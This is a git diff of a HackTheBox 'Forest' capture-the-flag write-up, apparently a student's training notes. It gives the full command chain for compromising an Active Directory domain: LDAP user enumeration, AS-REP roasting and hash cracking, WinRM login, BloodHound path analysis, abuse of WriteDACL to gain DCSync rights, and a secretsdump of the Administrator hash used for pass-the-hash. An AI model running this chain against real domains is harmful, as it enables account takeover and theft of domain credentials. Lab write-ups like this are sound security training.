@@ -9,14 +9,40 @@ services: ['kpasswd5', 'microsoft-ds', 'msrpc', 'netbios-ssn', 'kerberos-sec', '
 techniques_used: []
 tools_used: [nmap]
 ---
-
 # Forest
 
 **Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 14/06/2025
 
-## Summary
+## Overview
 
-## Reconnaissance
+Complete domain compromise through AS-REP roasting and privilege escalation to DCSync attack.
+
+```mermaid
+flowchart TD
+    A[LDAP Enumeration] --> B[AS-REP Roasting]
+    B --> C[Hash Cracking]
+    C --> D[Initial Access<br/>svc-alfresco]
+    D --> E[BloodHound Analysis]
+    E --> F[User Creation &<br/>Group Manipulation]
+    F --> G[WriteDACL Abuse<br/>DCSync Rights]
+    G --> H[Domain Admin]
+    
+    classDef recon fill:#e3f2fd,stroke:#1976d2
+    classDef exploit fill:#e8f5e8,stroke:#2e7d32
+    classDef privesc fill:#fff3e0,stroke:#f57c00
+    classDef goal fill:#ffebee,stroke:#c62828
+    
+    class A,B,C recon
+    class D,E exploit
+    class F,G privesc
+    class H goal
+```
+
+---
+
+## Phase 1: Reconnaissance & Initial Access
+
+### Network Discovery
 
 ```bash
 nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
@@ -37,7 +63,7 @@ nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
 | 3269 | tcpwrapped   | N/A                                             |
 | 5985 | http         | Microsoft HTTPAPI httpd 2.0                     |
 
-## Enumeration
+### DNS Configuration
 
 I generated and appended a static hostname mapping to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
 ```bash
@@ -47,10 +73,11 @@ tail -n 1 /etc/hosts
 10.10.10.161     FOREST.htb.local FOREST
 ```
 
+### User Discovery
+
 LDAP enumeration identified seven active domain users.
 ```bash
 nxc ldap 'FOREST' -u '' -p '' -d 'htb.local' --active-users | awk '{print $5}' | grep -v '^[H,\[,-]' > files/users.txt && cat files/users.txt 
-
 
 Administrator
 sebastien
@@ -61,7 +88,9 @@ mark
 santi
 ```
 
-## Exploitation
+---
+
+## Phase 2: Exploitation - AS-REP Roasting Attack
 
 Testing the user list for AS-REP roasting revealed account an account `svc-alfresco` with "Do Not Require Kerberos Pre-Authentication" enabled, and thus allowing me to retrieve their password hash.
 ```bash
@@ -79,6 +108,8 @@ hashcat -m 18200 -a 0 files/roast.txt /usr/share/wordlists/rockyou.txt
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e9b6f4b0b1ee2aeaba1821f22f189957bf8b9ee4f15f5ac1317a7c3678fd71f9fc0d926a3529dbfed42c26bf119bf475f96a38af3bdb1b0c6085cff57e63015e95b3fec76271c4736df2fb34c46edbca9614f05eee7e8c2c0e524aa2acd07de8a1b17feb7380c29ea75f86f328868bc893b9a36f41ba6f67ff3a02ff4ce1e2784868cc156b91ab5f5aa3a3f91e61fca6b61ab70dbd9e20a0f49a653078d638bf2588ad564c1c91d601cc07f7fc10b0e22f4b5803a0e8540eef8f2e1e9fd3e45525337b6ca0ef27788ae6ef610822c8e0147fd9b39919e8739a872ca3584d7658274:s3rvice
 ...
 ```
+
+### Initial Access
 
 The credentials worked for WinRM access on port `5985`.
 ```bash
@@ -100,7 +131,9 @@ User flag was in `svc-alfresco`'s Desktop.
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
 ```
 
-## Privilege Escalation
+---
+
+## Phase 3: Privilege Escalation - BloodHound Analysis
 
 SharpHound was already on the machine in the `svc-alfresco` user's home directory. I ran it to enumerate everything on the domain.
 ```powershell
@@ -121,17 +154,10 @@ And downloaded it to my machine.
 Info: Downloading C:\Users\svc-alfresco\20250614160957_loot.zip to 20250614160957_loot.zip                  
 ```
 
-So I started Bloodhound.
-```bash
-sudo ./bloodhound-cli containers start
+### Attack Path Discovery
 
-[+] Checking the status of Docker and the Compose plugin...
-[+] Starting the BloodHound environment
-[+] Running `docker` to restart containers with docker-compose.yml...
-```
-
-Imported the SharpHound data `20250614160957_loot.zip` and run a Custom Cypher Query to view the shortest path from owned principles (`svc-alfesco`) to domain Tier 0:
-```
+I imported the SharpHound data `20250614160957_loot.zip` into BloodHound and ran a Custom Cypher Query to view the shortest path from owned principles (`svc-alfesco`) to domain Tier 0:
+```cypher
 MATCH p = allShortestPaths((u:User)-[:AbuseTGTDelegation|AllowedToDelegate|HasSIDHistory|ADCSESC1|CanPSRemote|HasSession|ADCSESC10a|CanRDP|MemberOf|ADCSESC10b|CoerceAndRelayNTLMToADCS|Owns|ADCSESC13|CoerceAndRelayNTLMToLDAP|OwnsLimitedRights|ADCSESC3|CoerceAndRelayNTLMToLDAPS|ReadGMSAPassword|ADCSESC4|CoerceAndRelayNTLMToSMB|ReadLAPSPassword|ADCSESC6a|CoerceToTGT|SameForestTrust|ADCSESC6b|Contains|SpoofSIDHistory|ADCSESC9a|DCFor|SQLAdmin|ADCSESC9b|DCSync|SyncedToEntraUser|AddAllowedToAct|DumpSMSAPassword|SyncLAPSPassword|AddKeyCredentialLink|ExecuteDCOM|WriteAccountRestrictions|AddMember|ForceChangePassword|WriteDacl|AddSelf|GPLink|WriteGPLink|AdminTo|GenericAll|WriteOwner|AllExtendedRights|GenericWrite|WriteOwnerLimitedRights|AllowedToAct|GoldenCert|WriteSPN*1..]->(b:Base))
 WHERE "owned" IN split(u.system_tags, " ")
   AND "admin_tier_0" IN split(b.system_tags, " ")
@@ -139,8 +165,13 @@ RETURN p
 LIMIT 1000
 ``` 
 
-Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". That group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync..
+Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". That group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync.
 ![[Pasted image 20250615014133.png]]
+
+---
+
+## Phase 4: Advanced Exploitation - DCSync Attack
+
 To perform the DCSync attack, I firstly created a new credential object and domain user account called "`wither`".
 ```powershell
 $SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
@@ -163,10 +194,9 @@ Verbose: [Add-DomainObjectAcl] Granting principal CN=wither,CN=Users,DC=htb,DC=l
 ```
 >[!info] Important to note, `-Credential` using `wither`'s credential object was vital here for the attack to work, as I needed `Add-DomainObjectAcl` to run under the context of that account (as it was a member of "Exchange Windows Permissions" and thus had permission to modify ACLs) and not `svc-alfresco`.
 
-
 DCSync requested the `Administrator`'s password hash via domain replication through `secretsdump`.
 ```bash
-wither@kali:~/CTF/HTB/Forest/files$ secretsdump.py 'HTB'/'wither':'password'@'FOREST' 
+secretsdump.py 'HTB'/'wither':'password'@'FOREST' 
 
 ...
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
@@ -188,13 +218,19 @@ And get the root flag in the `Administrator`'s Desktop.
 *Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\Desktop\root.txt
 ```
 
+## Conclusion
+
+The `Account Operators` → `Exchange Windows Permissions` → `WriteDACL` → DCSync chain is commonly seen in enterprise environments. Standard Exchange installation requirements create these permission relationships, making this attack path reproducible across many organisations.
+
+---
+
 ## References
 
 - [ASREPRoast \| NetExec](https://www.netexec.wiki/ldap-protocol/asreproast)
 - [AS-REP Roasting \| Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 - [bloodhoundce-resources/custom\_queries/BloodHound\_CE\_Custom\_Queries.md at main · CompassSecurity/bloodhoundce-resources · GitHub](https://github.com/CompassSecurity/bloodhoundce-resources/blob/main/custom_queries/BloodHound_CE_Custom_Queries.md)
 - [HackTricks/windows-hardening/active-directory-methodology/dcsync.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/dcsync.md)
-- [AD Series \| DC Sync Attacks. DCSync Attack is a type of “credential… \| by Urshila Ravindran \| Medium](https://medium.com/@urshilaravindran/ad-series-dc-sync-attacks-e76bb54308f5)
+- [AD Series \| DC Sync Attacks. DCSync Attack is a type of "credential… \| by Urshila Ravindran \| Medium](https://medium.com/@urshilaravindran/ad-series-dc-sync-attacks-e76bb54308f5)
 
 ---
 #forest #htb #easy #windows #netexec #asreproast #hashcat #evil-winrm #bloodhound #sharphound #dcsync #secretsdump #pass-the-hash
